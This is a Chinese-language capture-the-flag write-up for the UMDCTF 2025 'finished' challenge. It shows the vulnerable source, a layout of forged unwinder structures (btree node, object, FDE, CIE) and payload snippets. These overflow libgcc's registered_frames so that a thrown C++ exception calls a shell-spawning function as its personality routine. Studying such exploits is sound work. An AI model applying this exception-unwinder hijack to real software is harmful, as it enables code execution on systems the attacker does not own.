# UMDCTF 2025 - finished

## 题目简述

这是 `unfinished` 的进阶版本。程序把最多 499 字节读入只有 128 字节的全局数组
`number`，随后无条件抛出一个 C++ 异常：

```cpp
char number[128];

void sigma_mode() {
    system("/bin/sh");
}

void the_rest_of_the_fucking_challenge() {
    int i;
    throw i;
}

fgets(number, 500, stdin);
the_rest_of_the_fucking_challenge();
```

二进制启用了 Canary、NX 和 Full RELRO，但溢出发生在 `.bss`，目标也不是普通返回地址。
真正的攻击面是 libgcc 异常展开器维护在相邻全局区的动态帧注册数据。

## 解题过程

`number` 位于 `0x41d060`，而 `registered_frames` 位于 `0x41d1b0`，两者只相距
`0x150` 字节，处于 `fgets` 的覆盖范围内。异常抛出后，展开器会查询已注册的
帧描述条目（FDE），再依据其 CIE 中的 augmentation 信息调用 personality routine。
因此可以在 `number` 内伪造完整查找链，并把 `registered_frames` 改成指向它。

官方解题脚本依次布置了以下对象：

```text
number + 0x00  伪造 btree 叶节点，PC 范围覆盖 0 到 2^64-1
number + 0x28  伪造 registered object
number + 0x50  仅含一个元素的 FDE 向量
number + 0x68  伪造 CIE
number + 0x1d8 伪造 FDE
```

根节点的区间覆盖全部程序计数器，因此无论在哪个调用点开始展开，都能命中伪造对象。
伪造 FDE 再用相对偏移指回 `number + 0x68` 的 CIE。最关键的是 CIE 的
augmentation 字符串及其数据：

```python
b"P\0" + uleb(13) + uleb(37) + p8(73) \
    + b"\x01" + uleb(0x401b16) + b"\0"
```

`P` 表示该 CIE 声明了 personality routine；`0x01` 选择 ULEB128 编码，
紧随其后的 `0x401b16` 正是 `sigma_mode()` 的固定地址。最后把
`registered_frames` 覆盖为伪造 btree 根：

```python
payload = flat({
    0x41d060: fake_btree_root,
    0x41d060 + 40: fake_object,
    0x41d060 + 80: fake_fde_vector,
    0x41d060 + 104: fake_cie,
    0x41d1b0: [0x41d060, 0, 0],
    0x41d060 + 472: fake_fde,
}, word_size=64)
```

`the_rest_of_the_fucking_challenge()` 抛出异常时，libgcc 查询被污染的注册表，
命中伪造 FDE/CIE，并把 `sigma_mode()` 当作 personality routine 调用，从而执行
`system("/bin/sh")`。在 shell 中读取 flag：

```text
UMDCTF{sorry_for_the_revenge_chall_hope_you_enjoyed_reading_exceptions}
```

## 方法总结

本题展示了全局缓冲区溢出如何攻击“控制流元数据”，而无需触碰栈返回地址或 GOT。
看到 C++ 异常、`__cxa_throw`、`_Unwind_*` 与相邻的 libgcc 全局对象时，应把
`.eh_frame`、CIE/FDE、personality routine 和动态 `registered_frames` 一并纳入
攻击面。这里 Full RELRO 和栈 Canary 都没有失效，只是保护的对象不是本题真正使用的
控制流入口。
